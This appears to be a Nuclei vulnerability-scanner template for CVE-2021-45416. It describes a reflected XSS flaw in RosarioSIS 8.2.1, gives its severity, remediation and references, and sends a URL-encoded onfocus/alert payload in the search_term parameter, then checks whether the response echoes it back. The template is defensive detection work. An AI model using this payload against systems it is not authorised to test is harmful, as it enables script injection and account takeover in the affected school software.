id: CVE-2021-45416

info:
  name: Reflected XSS in RosarioSIS 8.2.1
  author: ProjectDiscoveryAI
  severity: medium
  description: Reflected Cross-site scripting (XSS) vulnerability in RosarioSIS 8.2.1 allows attackers to inject arbitrary HTML via the search_term parameter in the modules/Scheduling/Courses.php script.
  impact: |
    Successful exploitation could allow an attacker to execute malicious scripts in the context of a victim's browser, leading to account takeover, sensitive data theft, or other attacks.
  remediation: |
    Apply the vendor-supplied patch or update to the latest version of RosarioSIS to mitigate the Reflected XSS vulnerability (CVE-2021-45416).
  reference:
    - https://github.com/86x/CVE-2021-45416
    - https://www.youtube.com/watch?v=PvFUxSGpWpY
    - https://gitlab.com/francoisjacquet/rosariosis/-/commit/aec018065ca12ecef03ee454a8112f992ea35315
    - https://github.com/dnr6419/CVE-2021-45416
    - https://github.com/trhacknon/Pocingit
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2021-45416
    cwe-id: CWE-79
    epss-score: 0.00112
    epss-percentile: 0.45929
    cpe: cpe:2.3:a:rosariosis:rosariosis:8.2.1:*:*:*:*:*:*:*
  metadata:
    vendor: rosariosis
    product: rosariosis

http:
  - method: GET
    path:
      - "{{BaseURL}}/Modules.php?modname=misc/ChooseCourse.php&modfunc=choose_course&course_modfunc=search&last_year=&search_term=%22%20onfocus%3D%22alert%28%60XSS%60%29"

    matchers:
      - type: word
        words:
          - "alert(`XSS`)"
        part: body
